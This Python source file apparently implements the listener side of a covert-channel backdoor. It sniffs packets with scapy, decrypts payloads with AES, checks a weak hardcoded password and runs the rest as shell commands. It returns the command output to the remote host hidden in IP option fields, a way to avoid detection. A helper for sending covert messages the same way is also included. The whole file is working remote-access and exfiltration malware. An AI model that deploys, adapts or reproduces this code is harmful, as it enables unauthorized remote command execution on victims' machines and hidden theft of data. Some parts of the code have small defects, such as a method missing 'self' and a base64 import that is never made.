from scapy.all import *
import dcexec
import netifaces
import fcntl
import socket
import struct
from dcaes import AESCipher


class Listener(object):
    def __init__(self, ip_list, lhost, sport, dport, protocol, key, watch_list=None):
        self.remote_ip = ip_list
        self.local_ip = lhost
        self.sport = int(sport)
        self.dport = int(dport)
        self.proto = protocol.upper()
        self.key = key
        self.chunk_length = 4

        self.cipher = AESCipher(self.key)
        self.executor = dcexec.Executor()
        self.executor.add_watches(watch_list)

        default_iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
        self.hw_addr = netifaces.ifaddresses(default_iface)[netifaces.AF_LINK][0]['addr']


    def listen(self):
        """
        Sniff for packets on the network interface using scapy. Filters packets out by source and destination IP
        address, as well as ports.
        """
        sniff(filter=
              self.proto.lower() + ' and src host ' + self.remote_ip +
              ' and dst port ' + str(self.dport) + ' and src port ' + str(self.sport),
              lfilter=self.is_incoming,
              prn=self.sniff_packets)


    def sniff_packets(self, pkt):
        """
        Handling function for filtered, sniffed packets. Ensures that packets are autheniticated by the
        password, retrieves the command from the packet payload, and sends it off to be executed.
        """
        load = self.cipher.decrypt_string(pkt[self.proto].payload.load)
        if load == '':
            return

        password = load[:8]
        command = load[8:]

        if password not in 'PASSWORD':
            return


        stdin, stderr  = self.executor.run(command)

        if stderr is not None:
            self.respond(pkt[IP].src, stderr)
            # print('sending: ' + stderr)
        elif stdin is not None:
            self.respond(pkt[IP].src, stdin)
            # print('sending: ' + stdin)

    def respond(self, host, response):
        """
        Sends the response to the client.
        """
        # split the response into equal size chunks if necessary
        chunks = [response[start:start + self.chunk_length] for start in
                  xrange(0, len(response), self.chunk_length)]

        ipoptions = IPOption()
        ipoptions.optclass = 'control'
        ipoptions.option = 'commercial_security'

        for chunk in chunks:
            # chunk = self.cipher.encrypt_string(chunk)

            ipoptions.value = chunk
            ipoptions.length = len(chunk) + 2

            if self.proto == 'UDP':
                packet = IP(dst=self.remote_ip,
                            src=self.local_ip,
                            options=[ipoptions])/UDP(sport=self.sport, dport=self.dport)
            elif self.proto == 'TCP':
                packet = IP(dst=self.remote_ip,
                            src=self.local_ip,
                            options=[ipoptions])/TCP(sport=self.sport, dport=self.dport)
            send(packet, verbose=False)


    def send_covert(message, source, dest, chunk_length, encode):
        chunks = [message[start:start + chunk_length] for start in xrange(0, len(message), chunk_length)]

        ipoptions = IPOption()
        ipoptions.optclass = 'control'
        ipoptions.option = 'commercial_security'

        for chunk in chunks:
            if encode:
                ipoptions.value = base64.b64encode(chunk)
                ipoptions.length = len(base64.b64encode(chunk)) + 2
            else:
                ipoptions.value = chunk
                ipoptions.length = len(chunk) + 2

            pack = IP(src=source, dst=dest, options=[ipoptions])
            send(pack, verbose=False)

        # the security flag marks end of the message
        ipoptions.option = 'security'
        ipoptions.value = ''
        ipoptions.length = 2
        pack = IP(dst=dest, src=source, options=[ipoptions])
        send(pack, verbose=False)

    def is_incoming(self, pkt):
        # return pkt[Ether].src != self.get_hw_addr(self.default_iface)
        return pkt[Ether].src != self.hw_addr
